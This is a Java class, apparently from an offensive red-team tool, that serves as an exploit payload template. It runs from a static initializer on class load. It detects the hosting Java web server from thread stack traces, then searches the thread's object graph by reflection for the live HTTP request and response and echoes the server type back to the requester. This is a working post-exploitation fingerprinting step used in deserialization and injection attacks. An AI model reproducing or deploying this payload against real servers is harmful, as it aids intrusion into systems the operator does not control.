package com.potato.potatotool.content.redTeam.payload.detector.templates;

import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashSet;
import java.util.Map;

public class DFSEchoDetectorTemplate {
    static HashSet<Object> h;
    static ClassLoader cl = Thread.currentThread().getContextClassLoader();
    static Class hsr;
    static Class hsp;
    static Object r;
    static Object p;
    private static String server_type = "none";

    static {
        new DFSEchoDetectorTemplate();
    }

    public DFSEchoDetectorTemplate() {
        initServerType();
        r = null;
        p = null;
        h = new HashSet<Object>();
        try {
            hsr = cl.loadClass("javax.servlet.http.HttpServletRequest");
            hsp = cl.loadClass("javax.servlet.http.HttpServletResponse");
        } catch (ClassNotFoundException ignored) {
        }
        F(Thread.currentThread(), 0);
    }

    private static boolean i(Object obj) {
        if (obj == null || h.contains(obj)) {
            return true;
        }
        h.add(obj);
        return false;
    }

    private static void p(Object o, int depth) {
        if (depth > 52 || (r != null && p != null)) {
            return;
        }
        if (!i(o)) {
            if (r == null && hsr != null && hsr.isAssignableFrom(o.getClass())) {
                r = o;
                try {
                    Method getResponse = r.getClass().getMethod("getResponse");
                    p = getResponse.invoke(r);
                } catch (Exception ignored) {
                    r = null;
                }
            } else if (p == null && hsp != null && hsp.isAssignableFrom(o.getClass())) {
                p = o;
            }
            if (r != null && p != null) {
                try {
                    PrintWriter pw = (PrintWriter) hsp.getMethod("getWriter").invoke(p);
                    pw.println(server_type);
                    pw.flush();
                    pw.close();
                } catch (Exception ignored) {
                }
                return;
            }
            F(o, depth + 1);
        }
    }

    private static void F(Object start, int depth) {
        Class n = start.getClass();
        do {
            Field[] fields = n.getDeclaredFields();
            for (int i = 0; i < fields.length; i++) {
                Field declaredField = fields[i];
                declaredField.setAccessible(true);
                try {
                    Object o = declaredField.get(start);
                    if (!o.getClass().isArray()) {
                        p(o, depth);
                    } else {
                        Object[] array = (Object[]) o;
                        for (int j = 0; j < array.length; j++) {
                            p(array[j], depth);
                        }
                    }
                } catch (Exception ignored) {
                }
            }
        } while ((n = n.getSuperclass()) != null);
    }

    public static void initServerType() {
        Map<Thread, StackTraceElement[]> stackTraces = Thread.getAllStackTraces();
        for (Map.Entry<Thread, StackTraceElement[]> entry : stackTraces.entrySet()) {
            StackTraceElement[] stackTraceElements = entry.getValue();
            for (int i = 0; i < stackTraceElements.length; i++) {
                String className = stackTraceElements[i].getClassName();
                if (className.contains("org.apache.catalina.core")) {
                    server_type = "tomcat";
                    return;
                }
                if (className.contains("weblogic.servlet.internal")) {
                    server_type = "weblogic";
                    return;
                }
                if (className.contains("com.caucho.server")) {
                    server_type = "resin";
                    return;
                }
                if (className.contains("org.eclipse.jetty.server")) {
                    server_type = "jetty";
                    return;
                }
                if (className.contains("com.ibm.ws")) {
                    server_type = "websphere";
                    return;
                }
                if (className.contains("io.undertow.server")) {
                    server_type = "undertow";
                    return;
                }
                if (className.contains("com.tongweb.web")) {
                    server_type = "tongweb";
                    return;
                }
                if (className.contains("com.apusic.web")) {
                    server_type = "apusic";
                    return;
                }
                if (className.contains("org.springframework.web")) {
                    server_type = "spring";
                    return;
                }
            }
        }
    }
}
